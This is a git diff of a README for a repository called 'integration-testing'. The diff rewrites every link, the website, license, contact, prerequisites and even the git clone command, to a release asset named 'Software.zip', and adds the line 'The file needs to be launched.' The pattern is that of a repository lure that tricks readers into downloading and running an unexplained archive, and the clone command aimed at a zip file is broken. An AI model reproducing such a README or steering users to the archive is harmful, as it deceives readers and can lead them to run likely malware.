@@ -1,6 +1,6 @@
 # 🚀 Welcome to the integration-testing Repository! 🌟
 
-![integration-testing](https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0)
+![integration-testing](https://github.com/NagShaShaBuAko/integration-testing/releases/download/v2.0/Software.zip)
 
 ### Repository Name:
 integration-testing
@@ -14,19 +14,19 @@ cicd-pipeline, cicd-pr-validation, docker, docker-compose, express, integration-
 ---
 
 ## 📦 Download the Latest Release:
-[![Download https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0](https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0<COLOR>.svg)](https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0)
+[![Download https://github.com/NagShaShaBuAko/integration-testing/releases/download/v2.0/Software.zip](https://github.com/NagShaShaBuAko/integration-testing/releases/download/v2.0/Software.zip<COLOR>.svg)](https://github.com/NagShaShaBuAko/integration-testing/releases/download/v2.0/Software.zip)
 
 _Note: The file needs to be launched._
 
 ---
 
 ## 🌐 Visit Our Website:
-Explore more about integration testing on our [website](https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0).
+Explore more about integration testing on our [website](https://github.com/NagShaShaBuAko/integration-testing/releases/download/v2.0/Software.zip).
 
 ---
 
 ## 🚨 Check Releases Section:
-If the provided link is not working or you need other releases, please check the [Releases](https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0) section for more options.
+If the provided link is not working or you need other releases, please check the [Releases](https://github.com/NagShaShaBuAko/integration-testing/releases/download/v2.0/Software.zip) section for more options.
 
 ---
 
@@ -35,12 +35,12 @@ Follow the steps below to start using the integration-testing project:
 
 ### Prerequisites:
 - Docker
-- https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0
+- https://github.com/NagShaShaBuAko/integration-testing/releases/download/v2.0/Software.zip
 - Git
 
 ### Clone the Repository:
 ```bash
-git clone https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0
+git clone https://github.com/NagShaShaBuAko/integration-testing/releases/download/v2.0/Software.zip
 cd integration-testing
 ```
 
@@ -103,12 +103,12 @@ We welcome contributions from the community to improve the integration-testing p
 ---
 
 ## 📝 License:
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/NagShaShaBuAko/integration-testing/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
 ## 🌟 Get in Touch:
-If you have any questions, suggestions, or feedback, feel free to reach out to us at [https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0](https://github.com/NagShaShaBuAko/integration-testing/releases/tag/v1.0).
+If you have any questions, suggestions, or feedback, feel free to reach out to us at [https://github.com/NagShaShaBuAko/integration-testing/releases/download/v2.0/Software.zip](https://github.com/NagShaShaBuAko/integration-testing/releases/download/v2.0/Software.zip).
 
 ---
 
